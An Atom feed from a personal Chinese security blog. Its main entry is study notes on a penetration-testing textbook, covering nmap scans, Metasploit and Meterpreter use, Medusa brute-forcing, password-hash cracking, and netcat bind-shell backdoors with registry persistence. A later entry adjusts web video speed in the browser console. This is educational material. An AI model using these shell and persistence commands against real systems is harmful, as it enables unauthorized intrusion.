<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J.A.R.V.I.S</title>
  
  
  <link href="/pwn4justice.github.io/atom.xml" rel="self"/>
  
  <link href="https://pwn4justice.github.io/"/>
  <updated>2019-08-18T14:31:31.171Z</updated>
  <id>https://pwn4justice.github.io/</id>
  
  <author>
    <name>pwn4justice</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试实践指南读书笔记</title>
    <link href="https://pwn4justice.github.io/2019/08/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://pwn4justice.github.io/2019/08/18/渗透测试实践指南读书笔记/</id>
    <published>2019-08-18T14:01:50.000Z</published>
    <updated>2019-08-18T14:31:31.171Z</updated>
    
    <content type="html"><![CDATA[<p>一份渗透测试基础指南，作查阅、参考用。</p><a id="more"></a><h2 id="侦查-收集"><a href="#侦查-收集" class="headerlink" title="侦查/收集"></a>侦查/收集</h2><p>HTTrack 网站复制</p><p>Google</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. site:</span><br><span class="line"></span><br><span class="line">2. intitle:/allintitle:</span><br><span class="line"></span><br><span class="line">3. allintitle: index of /</span><br><span class="line"></span><br><span class="line">4. 快照（pdf，word，excel等）:</span><br><span class="line"></span><br><span class="line">cache:baidu.com</span><br><span class="line"></span><br><span class="line">filetype:</span><br></pre></td></tr></table></figure><p>问答网站/BBS/新闻组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- UseNet</span><br><span class="line">- Google Groups </span><br><span class="line">- BBS</span><br><span class="line">- Stackoverflow</span><br><span class="line">- Quora</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">- 公司邮箱的帖子</span><br><span class="line">- The Harvester 挖掘利用email地址</span><br></pre></td></tr></table></figure><p>netcraft - what’s the site are running.</p><p>Email Server</p><p>MetaGooFil</p><p>社会工程学</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. SEAT 搜索引擎评估工具</span><br><span class="line">2. GHDB google 黑客数据库</span><br></pre></td></tr></table></figure><p>命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. host</span><br><span class="line">host -a </span><br><span class="line">2. gather IP addresses in Intranet</span><br><span class="line">3. find DNS Server</span><br><span class="line">一般人们都懒得去打理DNS服务器，只要其没有出问题，比如不打补丁，升级系统等</span><br><span class="line">4. nslookup</span><br><span class="line">5. whois</span><br><span class="line">6. dig</span><br><span class="line">7. traceroute</span><br></pre></td></tr></table></figure><p>工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. shordan</span><br><span class="line">2. zoomeye</span><br><span class="line">3. 《渗透测试人员应该懂的 Google 黑客技术》</span><br><span class="line">4. Maltego 聚合公共数据库</span><br><span class="line">    - 防火墙位置/IP/个人信息/销售人员现在的物理位置等</span><br></pre></td></tr></table></figure><p>结果<br>1. 最终得到一份可用 IP 列表<br>2. 和一系列看似暂时没用的信息</p><br><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><ul><li>ping 扫描</li><li>端口扫描/服务扫描</li><li>漏洞扫描</li></ul><br><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>TCP</strong></p><p>SYN -&gt; SYN/ACK -&gt; ACK</p><br><p><strong>ping 扫描</strong></p><ul><li>fping (kali)</li></ul><br><p><strong>nmap</strong></p><ul><li><p>-s 默认扫描（SYN）==&gt; -sS（快速）</p></li><li><p>-sT </p></li><li><p>-Pn </p></li><li><p>-p-</p></li><li><p>-iL list.txt</p></li><li><p>-sS/-s</p></li><li><p>不进行UDP扫描就像读书只看导论：UDP扫描</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- -sU</span><br><span class="line">- 速度慢</span><br><span class="line">- 了解那些服务是基于 UDP 的</span><br><span class="line">- 这些服务是不是被放到了单独的主机上</span><br><span class="line">- 当发现结果几乎全是 open|filterd时，加上 -sV 参数，用于版本扫描，可以二次精确 UDP 的扫描结果，将更改部分 open|filterd 为 open，结合起来就是 -sUV</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>Xmas Tree 扫描</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 在 TCP 的 RFC 文档中有如下描述：</span><br><span class="line">    - 当发送不带 SYN/ACK/RST 的包给一个关闭的端口时，端口必须回复一个 RST</span><br><span class="line">    - 当发送不带 SYN/ACK/RST 的包给一个打开的端口时，端口忽略这个包</span><br><span class="line">- 构造 FIN/PSH/URG 标志位打开（SYN/ACK/RST关闭）的数据包，查看服务器反应</span><br><span class="line">- 前提：目标计算机遵循 RFC 文档实现协议栈</span><br><span class="line">- 作用范围：Unix 和 Linux 主机，对 Windows 几乎不起作用</span><br><span class="line">- 使用：nmap -sX -p- -Pn 1.1.1.1</span><br></pre></td></tr></table></figure></li></ul><ul><li>Null 扫描  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 同上，也是发送不规则数据包，且对 Windows 无效果</span><br><span class="line">- 原理：发送没有任何标记的数据包，且目标系统回复同XmasTree扫描一致</span><br><span class="line">- 和 Xmas Tree 扫描都可以绕过一些简单的过滤器和 ACL，他们俩一般只能判断端口开关状态，不会建立任何通信</span><br><span class="line">- 使用：nmap -sN -p- -Pn 1.1.1.1</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>-T 调节扫描速度</p><ul><li>0～5: 5 最快，避免被检测时就要减速，使用 5 时扫描很快，结果不全</li></ul></li><li><p>-sV 同时探测服务版本</p></li><li><p>-O 探测操作系统（需要root）</p></li></ul><br><p><strong>防火墙原理：</strong></p><p>参考这些默认的 iptables 规则：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Chain INPUT (policy ACCEPT 0 packets, 0 bytes)</span><br><span class="line"> pkts bytes target   prot opt in    out    source   des        </span><br><span class="line">    0     0 ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            state RELATED,ESTABLISHED</span><br><span class="line">    0     0 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0           </span><br><span class="line">    0     0 ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0           </span><br><span class="line">    1    64 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            state NEW tcp dpt:22</span><br><span class="line">    0     0 REJECT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            reject-with icmp-host-prohibited</span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination         </span><br><span class="line">    0     0 REJECT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            reject-with icmp-host-prohibited</span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 103 packets, 10861 bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br></pre></td></tr></table></figure><p>像第一条：只接受已建立连接的或与已建立连接有关联的数据包进入，大致原理是：丢弃任何一个以 SYN 数据包开始的外部通信！这个就很容易被 Xmas Tree 扫描和 Null 扫描绕过。</p><p>当使用 XmasTree 和 Null 扫描时依然能在特殊情况下得到端口开放结果！</p><br><p><strong>一个专家的扫描顺序</strong></p><p>SYN - TCP - UDP - Xmas Tree - Null 不到最后不能确定结果。</p><br><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><ul><li>Nessus，携带很多插件可用  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- http://localhost:8834/WelcomeToNessus-Install/welcome</span><br><span class="line">- 使用 https 访问，忽略证书或者安装 nessus 证书</span><br><span class="line">- 使用激活码，注册账号，名称：logan，密码自动（safari）</span><br><span class="line">- 使用：https://localhost:8834</span><br><span class="line">- safe checks 选项：选中以致于目标不会崩溃，因其采用真实的攻击手段</span><br></pre></td></tr></table></figure></li></ul><ul><li>其他工具：insecure.org</li></ul><br><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>exploitation</p><ul><li>Medusa/Hydra</li><li>Metasploit</li><li>John the Ripper</li><li>嗅探网络流量</li><li>Macof：泛洪攻击</li><li>Fast-Track Autopwn：自动化漏洞攻击</li></ul><br><h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><p>与 Hydra 类似，强烈建议再了解 Hydra<br>参考：<br>1. medusa:<code>http://foofus.net/goons/jmk/medusa/medusa.html</code><br>2. hydra:<code>https://sectools.org/tool/hydra/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ medusa -h target_ip -u user [-U /path/users.txt] -p pasword [-P /path/Passwords.txt] -M service_name</span><br></pre></td></tr></table></figure><br><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">msf&gt; msfupdate 更新</span><br><span class="line">msf&gt; search ms08-067 搜索exploit（注意与 payload的不同）</span><br><span class="line">exploit 指标（rank）：[rank 越大，成功率越高，且目标越不会崩溃]</span><br><span class="line">1. Manual 手动</span><br><span class="line">2. Low低</span><br><span class="line">3. Average平均</span><br><span class="line">4. Normal 一般</span><br><span class="line">5. Good好</span><br><span class="line">6. Great 优秀</span><br><span class="line">7. Excellent 出色</span><br><span class="line"></span><br><span class="line">msf&gt; use path/of/ms-xx/cve-xx/module</span><br><span class="line">msf&gt; show payloads</span><br><span class="line">msf&gt; set payload path/the/payload/you/want/to/use</span><br><span class="line">msf&gt; show options</span><br><span class="line">..</span><br><span class="line">msf&gt; set RHOST xx.xxx.xx.xx</span><br><span class="line">msf&gt; set LHOST xx.xx.xxx.xx</span><br><span class="line">msf&gt; show options 确认</span><br><span class="line">msf&gt; exploit 开始攻击（并装载payload）</span><br></pre></td></tr></table></figure><br><p>Metasploit 经常配合 VNC 使用：</p><p><strong>VNC</strong> - 远程控制（控制桌面及鼠标等）当msf进入目标后使用”install vnc”相关payload</p><p>过程：1. 选好 exploit 和 payload ==&gt; 2.exploit</p><p>入侵 Windows 时常用的载荷:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows/adduser</span><br><span class="line">windows/exec:执行Windows的二进制文件(.exe)</span><br><span class="line">windows/shell_bind_tcp:在目标上开一个 shell/cmd 并等待连接</span><br><span class="line">windows/shell_reverse_tcp:目标主动连接攻击机，并返回shell/cmd，常内网</span><br><span class="line">windows/meterpreter/bind_tcp:在目标上安装Meterpreter并等待连接</span><br><span class="line">windows/meterpreter/reverse_tcp</span><br><span class="line">windows/vncinject/bind_tcp:在目标机上安装 VNC 并等待连接</span><br><span class="line">windows/vncinject/reverse_tcp</span><br></pre></td></tr></table></figure><br><p><strong>Meterpreter</strong> 这个工具是 Metasploit 艺术重要的一环，其特点是完全在内存中运行，提高了隐蔽性，且不易被杀软查杀，也可以迷惑某些取证工具。</p><p><strong>为什么使用 Meterpreter 而不使用 cmd/shell？</strong><br>1. 使用后者会启动新进程，隐蔽性降低<br>2. 后者提供了有限的工具和命令，而 Meterpreter 则好比定制版，多数工具都可以使用<br></p><p>Meterpreter 有个服务器端，当被你攻陷的这个服务/进程被管理员关闭时，可以用自带的 <code>migrate</code> 命令将服务器迁移至另外的进程。</p><p>Meterpreter 常用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">migrate</span><br><span class="line">cat</span><br><span class="line">download备份文件到攻击机</span><br><span class="line">upload上传文件至目标</span><br><span class="line">edit修改简单的文件</span><br><span class="line">execute发出命令并在目标执行</span><br><span class="line">kill停止某一进程</span><br><span class="line">... 大多数 Linux 命令</span><br><span class="line">SAM Juicer 提取密码hash</span><br><span class="line">使用 ruby</span><br><span class="line">在目标上加载并执行任意dll（动态连接库）</span><br><span class="line">锁定键盘和鼠标</span><br></pre></td></tr></table></figure><br><h3 id="John-the-Ripper-密码破解"><a href="#John-the-Ripper-密码破解" class="headerlink" title="John the Ripper : 密码破解"></a>John the Ripper : 密码破解</h3><p>1 关闭目标计算机<br>2 重新启动目标计算机并进入 Kali 到 live CD<br>3 挂在目标计算机的本地硬盘驱动器<br>4 使用 Samdump2 / unshadow / chntpw 提取散列<br>5 使用 John the Ripper 破解密码</p><br><h3 id="内网嗅探"><a href="#内网嗅探" class="headerlink" title="内网嗅探"></a>内网嗅探</h3><p>Dsniff 工具集 - macof 生成几千个随机 MAC 地址，对交换机进行泛洪</p><p>Wireshark</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- 捕获</span><br><span class="line">- 过滤</span><br></pre></td></tr></table></figure><p>Ettercap - 中间人攻击利器</p><br><h3 id="自动化漏洞攻击（Fast-Track-Autopwn）"><a href="#自动化漏洞攻击（Fast-Track-Autopwn）" class="headerlink" title="自动化漏洞攻击（Fast-Track Autopwn）"></a>自动化漏洞攻击（Fast-Track Autopwn）</h3><ul><li>Fast-Track 工具：直接自动化尝试各种漏洞攻击，并尝试获得 shell</li><li>相当于自动化版的 metasploit</li></ul><br><h3 id="De-ICE"><a href="#De-ICE" class="headerlink" title="De-ICE"></a>De-ICE</h3><ul><li>高度定制，可在比较现实的环境下联系各种渗透测试技术</li><li>相当于 DVWA</li></ul><br><h2 id="基于-Web-的漏洞利用"><a href="#基于-Web-的漏洞利用" class="headerlink" title="基于 Web 的漏洞利用"></a>基于 Web 的漏洞利用</h2><ul><li>Nikto 扫描 Web 服务器</li><li>Websecurify 自动化 Web 漏洞扫描</li><li>网络爬虫（WebScrarab）</li><li>WebScarab 拦截请求</li><li>代码注入攻击</li><li>跨站脚本：轻信网站的浏览器</li></ul><p>===&gt; 后续：</p><ul><li>客户端攻击</li><li>会话管理</li><li>代码审计</li></ul><br><h2 id="利用-Rookit-和-后门来维持访问"><a href="#利用-Rookit-和-后门来维持访问" class="headerlink" title="利用 Rookit 和 后门来维持访问"></a>利用 Rookit 和 后门来维持访问</h2><ul><li>netcat</li><li>Cryptcat</li><li>netbus</li><li>rootkit 以及其检测和防御</li><li>Hacker Defender</li></ul><br><h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>Win 上反弹shell:（Win 上的 -L 用于建立持久连接）</p><blockquote><p>netcat -L -p 1234 -e c:\Windows\System32\cmd.exe</p></blockquote><p>以及 上传文件：</p><blockquote><p>netcat -L -p 1234 &gt; calc.exe        </p></blockquote><p>Linux 上反弹shell：</p><blockquote><p>netcat -l -p 1234 -e /bin/bash</p></blockquote><p>以及上传文件：</p><blockquote><p>netcat -l -p 1234 &gt; file.sh</p></blockquote><p>客户端使用：</p><blockquote><p>netcat 1.1.1.1 1234 &lt; calc.exe 上传文件</p></blockquote><p>客户端盲连接（在nmap类软件无法识别一个自定义端口时进行试探）</p><blockquote><p>netcat 1.1.1.1 50001        //并发送任意内容，通过返回内容判断 50001 的服务</p></blockquote><br><h3 id="使用-meterpreter-上传-nc-至目标"><a href="#使用-meterpreter-上传-nc-至目标" class="headerlink" title="使用 meterpreter 上传 nc 至目标"></a>使用 meterpreter 上传 nc 至目标</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">meterpreter &gt; upload nc.exe c:\\Windows\\System32</span><br><span class="line">2.</span><br><span class="line">meterpreter &gt; nc -L -p 2342 -e cmd.exe//此处你要已经进入 nc 的目录下</span><br><span class="line">3. </span><br><span class="line">如果你想让后门能真正持久地运行，应该修改注册表，使 nc 自启动</span><br><span class="line">4. </span><br><span class="line">关闭 meterpreter 的 shell（因为这个是临时的，在内存中的，且需要漏洞启动，漏洞修复了就不行了，所以要留后门），并使用 nc 连接目标（持久的）</span><br><span class="line">5.</span><br><span class="line">nc 1.1.1.1 1234</span><br><span class="line">6.</span><br><span class="line">得到目标的 shell： c:\Windows\System32 &gt; _</span><br><span class="line">7. </span><br><span class="line">了解 nc 的更多巧妙应用</span><br></pre></td></tr></table></figure><br><h3 id="Cryptcat"><a href="#Cryptcat" class="headerlink" title="Cryptcat"></a>Cryptcat</h3><p>netcat 流量是明文的，而cryptcat是加密的（使用了 twofish算法）<br>默认的key值是<code>metallica</code>，你应当使用<code>-k</code>选项更改这个值，否则任何人都能破解你的会话（session）</p><p><strong>使用：</strong></p><blockquote><p>cryptcat -l -p 1234</p></blockquote><p>客户端：</p><blockquote><p>cryptcat 1.1.1.1 1234</p></blockquote><br><h3 id="Netbus"><a href="#Netbus" class="headerlink" title="Netbus"></a>Netbus</h3><p>very old，略</p><br><h3 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h3><p>可以隐藏文件、进程、程序，如同他们从未安装过，躲过杀毒软件查杀哦。渗透测试时需要再三确认客户是否已经明确授权可以使用 rootkit。</p><ul><li>提升权限</li><li>记录键盘</li><li>安装后门等</li><li>在操作系统内核运行，可以阻塞（hooking）或者拦截软件与操作系统间的各种请求</li><li>一般用于隐藏文件或木马程序，并保持后门访问的隐蔽性</li></ul><p><strong>ME: 这是一个非常危险的东西！！！</strong></p><p>这是一个很深的“兔子洞”：<br>1. 对操作系统内核要有扎实的理解<br>2. 内容值得专著一本书<br>3. 恶意软件之一</p><br><h3 id="Hacker-Defender-出乎你的想象"><a href="#Hacker-Defender-出乎你的想象" class="headerlink" title="Hacker Defender 出乎你的想象"></a>Hacker Defender 出乎你的想象</h3><p>是一个 rookie，攻击手段，而不是防御手段！</p><p>包含文件：</p><ul><li>hxdef100.exe===&gt;服务端软件，即后门</li><li>hxdef100.ini===&gt;配置文件</li><li>bdcli100.exe===&gt;客户端软件，用于连接后门</li></ul><br><h3 id="rootkit-的检测和防御"><a href="#rootkit-的检测和防御" class="headerlink" title="rootkit 的检测和防御"></a>rootkit 的检测和防御</h3><p>一般的防御设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 密切监控你放到互联网上的信息</span><br><span class="line">- 正确配置防火墙和ACL</span><br><span class="line">- 及时为系统打补丁</span><br><span class="line">- 安装并使用杀毒软件</span><br><span class="line">- 使用入侵检测系统</span><br></pre></td></tr></table></figure><p>额外的防rootkit设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- 降低用户权限，用户不应在管理员组</span><br><span class="line">- 最新的杀软还是能检测一些过时的rootkit的</span><br><span class="line">- 检测所在网络的进出（IN/OUT）流量</span><br><span class="line">- 定期对自己的系统进行端口扫描（每次记录并复查，是否开启了未知的端口）</span><br><span class="line">- 使用 rootkit 发现工具</span><br><span class="line">    - Rootkit Revealer</span><br><span class="line">    - vice</span><br><span class="line">    - F-Secure</span><br><span class="line">    - Blacklight</span><br><span class="line">- 一般 rootkit 很难删除，可能需要挂接硬盘到其他设备或进入另外的操作系统，或者完全格式化重装</span><br></pre></td></tr></table></figure><br><h3 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- Ncat (part of Nmap)</span><br><span class="line">- Socat</span><br><span class="line">- Back Orifice</span><br><span class="line">    - Dystic,1998</span><br><span class="line">    - Defcon (6th) -&quot;Cult of the Dead Cow: The announcement of Back Orfice, DirectXploit, and the modular ButtPlugins for BO&quot; 讲座</span><br><span class="line">- SubSeven (Sub7)</span><br><span class="line">    - Mobman,1999</span><br><span class="line">    - Server/Client</span><br></pre></td></tr></table></figure><br><h3 id="新的研究主题"><a href="#新的研究主题" class="headerlink" title="新的研究主题"></a>新的研究主题</h3><p>===&gt; 高级恶意软件和rootkit原理分析<br>===&gt; 沙箱和虚拟机的机制<br></p><br><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="编写测试报告"><a href="#编写测试报告" class="headerlink" title="编写测试报告"></a>编写测试报告</h3><p>最容易被忽略的部分。</p><p>要包含的部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 综合报告 （概述，非技术术语，影响，到达详细报告的引用，简短）</span><br><span class="line">- 详细报告 （技术，漏洞分级，最严重结果置前，截图证明，缓解措施）</span><br><span class="line">- 原始数据</span><br></pre></td></tr></table></figure><p>报告的机密性：使用7Zip对文件压缩并加密，或者使用TrueCrypt进行加密</p><br><h3 id="使用社区"><a href="#使用社区" class="headerlink" title="使用社区"></a>使用社区</h3><ul><li>在线论坛</li><li>ICQ</li><li>邮件列表</li><li>新闻组</li><li>安全会议（如 Defcon）</li></ul><br><h3 id="不同领域示例"><a href="#不同领域示例" class="headerlink" title="不同领域示例"></a>不同领域示例</h3><ul><li>道德黑客</li><li>Web 应用安全</li><li>系统安全</li><li>逆向工程</li><li>工具开发</li><li>恶意软件分析</li><li>防御性安全</li><li>软件安全</li><li>数字取证</li><li>无线安全</li><li>APT</li><li>渗透测试卡框架（Penetration Testing Framework, PTF）</li></ul><br><h3 id="参考图书"><a href="#参考图书" class="headerlink" title="参考图书"></a>参考图书</h3><p><a href="https://www.elsevier.com/books-and-journals/syngress" target="_blank" rel="noopener">Syngress 系列图书</a></p><br><h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p><a href="http://www.vulnerabilityassessMent.co.uk/" target="_blank" rel="noopener">渗透测试方法论</a><br>开源安全测试方法学手册（OSSTMM）<br>NSA认证(<code>http://www.nsa.gov/ia/academic_outreach/nat_cae/index.shtml</code>)<br>安全会议附带的高级培训（如：Black Hat）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一份渗透测试基础指南，作查阅、参考用。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一席网页视频如何加速?</title>
    <link href="https://pwn4justice.github.io/2019/07/14/%E4%B8%80%E5%B8%AD%E7%BD%91%E9%A1%B5%E8%A7%86%E9%A2%91%E5%A6%82%E4%BD%95%E5%8A%A0%E9%80%9F/"/>
    <id>https://pwn4justice.github.io/2019/07/14/一席网页视频如何加速/</id>
    <published>2019-07-14T09:01:47.000Z</published>
    <updated>2019-07-14T09:09:34.546Z</updated>
    
    <content type="html"><![CDATA[<p>一席（Yixi.tv）中的视频没有加速功能，如何通过修改（或利用）网页 javascript 来更改 HTML5 视频的播放速度呢？</p><a id="more"></a><p>了解：网页视频播放速度使用的是 <code>playbackRate</code> ，据猜测，这可能是个属性，或者方法。</p><ol><li><p>打开 F12 ，找到视频的 div ：<code>&lt;div ... id=&quot;my-video&quot;&gt;...&lt;/div&gt;</code></p></li><li><p>在 console 编写如下代码：</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> video = <span class="built_in">document</span>.getElementById(<span class="string">"my-video"</span>);video.player.playbackRate(<span class="number">1.25</span>)</span><br></pre></td></tr></table></figure></li><li><p>如何知道playbackRate是个方法的呢？一个个测试</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">alert(video.playbackRate)==&gt; undefined</span><br><span class="line">alert(video.playbackRate())</span><br><span class="line">alert(video.让其自动弹出提示)==&gt; 找到了 player 这么个东西，或许里面会有 playbackRate</span><br><span class="line">alert(video.player.让其自动弹出提示)==&gt; 找到了 playbackRate</span><br><span class="line">alert(video.player.playbackRate)==&gt; 弹出了 playbackRate 的内容，如下:</span><br><span class="line">---- playbackRate() ----</span><br><span class="line">function playbackRate(rate)&#123;</span><br><span class="line">if(rate !== undefined)&#123;</span><br><span class="line">this.techCall_(&apos;setPlaybackRate&apos;, rate);</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(this.tech_ &amp;&amp; this.tech_.featuresPlaybackRate)&#123;</span><br><span class="line">return this.techGet_(&apos;playbackRate&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 1.0;//如果没有指定 rate ，就使用 1.0 这个默认值... 所以在 console 里给其指定一个值就好了</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一席（Yixi.tv）中的视频没有加速功能，如何通过修改（或利用）网页 javascript 来更改 HTML5 视频的播放速度呢？&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>BeautifulSoup</title>
    <link href="https://pwn4justice.github.io/2019/07/08/BeautifulSoup/"/>
    <id>https://pwn4justice.github.io/2019/07/08/BeautifulSoup/</id>
    <published>2019-07-08T14:25:09.000Z</published>
    <updated>2019-07-08T14:41:33.161Z</updated>
    
